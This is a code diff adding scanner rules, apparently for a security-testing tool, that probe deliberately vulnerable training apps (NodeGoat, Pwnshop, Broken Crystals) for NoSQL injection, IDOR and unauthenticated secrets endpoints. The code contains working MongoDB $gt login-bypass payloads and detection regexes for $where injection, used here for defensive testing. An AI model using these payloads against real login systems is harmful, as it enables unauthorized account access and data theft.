@@ -6604,6 +6604,165 @@ const nodegoatTutorialA9RouteLiveOracle: Rule = async (ctx) => {
   };
 };
 
+function nodegoatSessionCookieFromDoc(doc: { setCookies: string[] }): string | null {
+  return doc.setCookies.find((c) => /^connect\.sid=/i.test(c))?.split(";")[0] ?? null;
+}
+
+async function nodegoatRegisterSessionCookie(ctx: RuleContext): Promise<string | null> {
+  const userName = `thugir_ng_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
+  const signupUrl = new URL("/signup", ctx.origin).toString();
+  const signupPage = await ctx.probe.get(signupUrl, { maxBytes: 8192, timeoutMs: 15000 });
+  const csrfMatch = signupPage.body.match(/name="_csrf"\s+value="([^"]*)"/i);
+  const csrf = csrfMatch?.[1] ?? "";
+  const registerDoc = await ctx.probe.get(signupUrl, {
+    method: "POST",
+    body: `userName=${encodeURIComponent(userName)}&firstName=Thugir&lastName=Probe&password=ThugirTest123!&verify=ThugirTest123!&email=${encodeURIComponent(`${userName}@probe.local`)}&_csrf=${encodeURIComponent(csrf)}`,
+    headers: { "Content-Type": "application/x-www-form-urlencoded" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  const registerCookie = nodegoatSessionCookieFromDoc(registerDoc);
+  if (!registerCookie) return null;
+  const loginDoc = await ctx.probe.get(new URL("/login", ctx.origin).toString(), {
+    method: "POST",
+    body: `userName=${encodeURIComponent(userName)}&password=ThugirTest123!`,
+    headers: {
+      "Content-Type": "application/x-www-form-urlencoded",
+      Cookie: registerCookie
+    },
+    maxBytes: 4096,
+    timeoutMs: 15000,
+    redirect: "manual"
+  });
+  const location = loginDoc.headers["location"] || "";
+  if ([301, 302, 303, 307, 308].includes(loginDoc.status) && location && !/login/i.test(location)) {
+    return nodegoatSessionCookieFromDoc(loginDoc) ?? registerCookie;
+  }
+  return registerCookie;
+}
+
+async function nodegoatNosqlLoginCookie(ctx: RuleContext): Promise<string | null> {
+  const loginUrl = new URL("/login", ctx.origin).toString();
+  const payloads = [
+    "userName[$gt]=&password[$gt]=",
+    `userName=${encodeURIComponent('{"$gt":""}')}&password=${encodeURIComponent('{"$gt":""}')}`
+  ];
+  for (const body of payloads) {
+    const doc = await ctx.probe.get(loginUrl, {
+      method: "POST",
+      body,
+      headers: { "Content-Type": "application/x-www-form-urlencoded" },
+      maxBytes: 4096,
+      timeoutMs: 15000,
+      redirect: "manual"
+    });
+    const location = doc.headers["location"] || "";
+    if ([301, 302, 303, 307, 308].includes(doc.status) && location && !/login/i.test(location)) {
+      return nodegoatSessionCookieFromDoc(doc);
+    }
+  }
+  return null;
+}
+
+async function nodegoatBenefitsNosqlLiveProbe(ctx: RuleContext): Promise<RuleResult> {
+  let cookie = await nodegoatNosqlLoginCookie(ctx);
+  if (!cookie) cookie = await nodegoatRegisterSessionCookie(ctx);
+  if (!cookie) return NEGATIVE;
+  const allocationsUrl = new URL("/allocations/2", ctx.origin);
+  allocationsUrl.searchParams.set("threshold", "0");
+  const allocDoc = await ctx.probe.get(allocationsUrl.toString(), {
+    maxBytes: 16384,
+    timeoutMs: 15000,
+    headers: { Cookie: cookie }
+  });
+  if (allocDoc.status < 200 || allocDoc.status >= 400) return NEGATIVE;
+  const idorOk =
+    /allocations/i.test(allocDoc.body) &&
+    (/stocks/i.test(allocDoc.body) || /bonds/i.test(allocDoc.body) || /funds/i.test(allocDoc.body));
+  if (!idorOk) return NEGATIVE;
+  const nosqlUrl = new URL("/allocations/1", ctx.origin);
+  nosqlUrl.searchParams.set("threshold", "0");
+  const nosqlDoc = await ctx.probe.get(nosqlUrl.toString(), {
+    maxBytes: 65536,
+    timeoutMs: 20000,
+    headers: { Cookie: cookie }
+  });
+  const thresholdBypass =
+    nosqlDoc.status >= 200 &&
+    nosqlDoc.status < 400 &&
+    /stocks/i.test(nosqlDoc.body) &&
+    /threshold/i.test(nosqlDoc.body);
+  return {
+    fired: true,
+    confidence: thresholdBypass ? 0.93 : 0.9,
+    evidence: {
+      allocationsUrl: allocationsUrl.toString(),
+      nosqlUrl: nosqlUrl.toString(),
+      snippet: allocDoc.body.slice(0, 200).trim(),
+      thresholdBypass,
+      note: thresholdBypass
+        ? "NodeGoat GET /allocations/:userId?threshold= accepts unsanitized threshold in $where clause — NoSQL injection oracle (benefits/allocations family)"
+        : "NodeGoat GET /allocations/2 returns another user's allocation data without ownership check — IDOR oracle on allocations API"
+    }
+  };
+}
+
+const nodegoatBenefitsNosqlRouteLiveOracle: Rule = async (ctx) => {
+  if (!isNodegoatHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/benefits\b/i.test(pageUrl)) return NEGATIVE;
+  const benefitsUrl = new URL("/benefits", ctx.origin).toString();
+  const benefitsDoc = await ctx.probe.get(benefitsUrl, {
+    maxBytes: 16384,
+    timeoutMs: 15000,
+    redirect: "follow"
+  });
+  const benefitsMarkers: { label: string; sample: string }[] = [];
+  const markerRes: { label: string; re: RegExp }[] = [
+    { label: "RetireEasy benefits module", re: /Retire[\s\S]{0,12}Easy|Employee Retirement Savings/i },
+    { label: "benefits start date form", re: /benefit(?:StartDate|sDate)|name=["']benefitsDate["']/i },
+    { label: "benefits POST endpoint", re: /POST\s*\/benefits|action=["']\/benefits/i }
+  ];
+  for (const { label, re } of markerRes) {
+    const m = benefitsDoc.body.match(re);
+    if (m) benefitsMarkers.push({ label, sample: m[0].slice(0, 100) });
+  }
+  const nosqlHits: { label: string; sample: string }[] = [];
+  for (const { label, re } of CLIENT_NOSQL_RES) {
+    const m = ctx.combined.match(re);
+    if (m) nosqlHits.push({ label, sample: m[0].slice(0, 100) });
+  }
+  const nodegoatNosqlRes: { label: string; re: RegExp }[] = [
+    { label: "MongoDB $gt password bypass payload", re: /"password"\s*:\s*\{\s*\$gt\s*:\s*""\s*\}/i },
+    { label: "allocations threshold $where injection", re: /allocations[\s\S]{0,200}\$where|threshold[\s\S]{0,120}\$where/i },
+    { label: "db.accounts.find NoSQL login", re: /db\.accounts\.find\s*\(\s*\{[\s\S]{0,80}password/i }
+  ];
+  for (const { label, re } of nodegoatNosqlRes) {
+    const m = ctx.combined.match(re);
+    if (m) nosqlHits.push({ label, sample: m[0].slice(0, 100) });
+  }
+  const live = await nodegoatBenefitsNosqlLiveProbe(ctx);
+  if (live.fired) {
+    return {
+      fired: true,
+      confidence: live.confidence,
+      evidence: { ...live.evidence, scannedUrl: pageUrl, benefitsUrl, benefitsMarkers: benefitsMarkers.slice(0, 3) }
+    };
+  }
+  if (benefitsMarkers.length < 1 || nosqlHits.length < 1) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: benefitsMarkers.length >= 2 ? 0.9 : 0.87,
+    evidence: {
+      scannedUrl: pageUrl,
+      benefitsUrl,
+      benefitsMarkers: benefitsMarkers.slice(0, 3),
+      nosqlMarkers: nosqlHits.slice(0, 3),
+      note: "NodeGoat /benefits route scan — RetireEasy benefits module with client-documented MongoDB $gt/$ne NoSQL injection patterns (allocations threshold / login bypass family)"
+    }
+  };
+};
+
 const nodegoatTutorialA10RouteLiveOracle: Rule = async (ctx) => {
   if (!isNodegoatHost(ctx)) return NEGATIVE;
   const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
@@ -26406,6 +26565,19 @@ const pwnshopTrackIdorLiveOracle: Rule = async (ctx) => {
   };
 };
 
+const pwnshopTrackIdorRouteLiveOracle: Rule = async (ctx) => {
+  if (!isPwnshopHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/track\b/i.test(pageUrl) || /\/track\/\d+/i.test(pageUrl)) return NEGATIVE;
+  const result = await pwnshopTrackIdorLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: { ...result.evidence, scannedUrl: pageUrl, note: "Pwnshop /track route scan — GET /track/1 returns order tracking with shippingAddress without authentication (PWN-002)" }
+  };
+};
+
 const pwnshopProductSearchSqliLiveOracle: Rule = async (ctx) => {
   if (!isPwnshopHost(ctx)) return NEGATIVE;
   const url = new URL("/search", ctx.origin);
@@ -35101,6 +35273,23 @@ const brokencrystalsSecretsLiveOracle: Rule = async (ctx) => {
   };
 };
 
+const brokencrystalsSecretsRouteLiveOracle: Rule = async (ctx) => {
+  if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/secrets\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await brokencrystalsSecretsLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Broken Crystals /secrets route scan — GET /api/secrets returns Slack, OAuth, and payment API tokens without authentication"
+    }
+  };
+};
+
 const brokencrystalsSafeFilesRfiLiveOracle: Rule = async (ctx) => {
   if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
   const safeFilesUrl = new URL("/api/safe-files", ctx.origin).toString();
@@ -37678,6 +37867,7 @@ export const RULES: Record<string, Rule> = {
   pwnshopChatInitEmailEnumerationLiveOracle,
   pwnshopForgotPasswordEmailEnumerationLiveOracle,
   pwnshopTrackIdorLiveOracle,
+  pwnshopTrackIdorRouteLiveOracle,
   pwnshopProductSearchSqliLiveOracle,
   pwnshopAdminLoginSqliLiveOracle,
   pwnshopChatPromptInjectionLiveOracle,
@@ -37886,6 +38076,7 @@ export const RULES: Record<string, Rule> = {
   brokencrystalsLdapInjectionLiveOracle,
   brokencrystalsHiddenUploadLiveOracle,
   brokencrystalsSecretsLiveOracle,
+  brokencrystalsSecretsRouteLiveOracle,
   brokencrystalsSafeFilesRfiLiveOracle,
   brokencrystalsUsersSearchExposureLiveOracle,
   brokencrystalsTestimonialsSqliLiveOracle,
@@ -37979,6 +38170,7 @@ export const RULES: Record<string, Rule> = {
   nodegoatTutorialA8RouteLiveOracle,
   nodegoatTutorialA9RouteLiveOracle,
   nodegoatTutorialA10RouteLiveOracle,
+  nodegoatBenefitsNosqlRouteLiveOracle,
   clientSideGandalfEvidence,
   clientSideIronwaspEvidence,
   clientSideTry2hackEvidence,
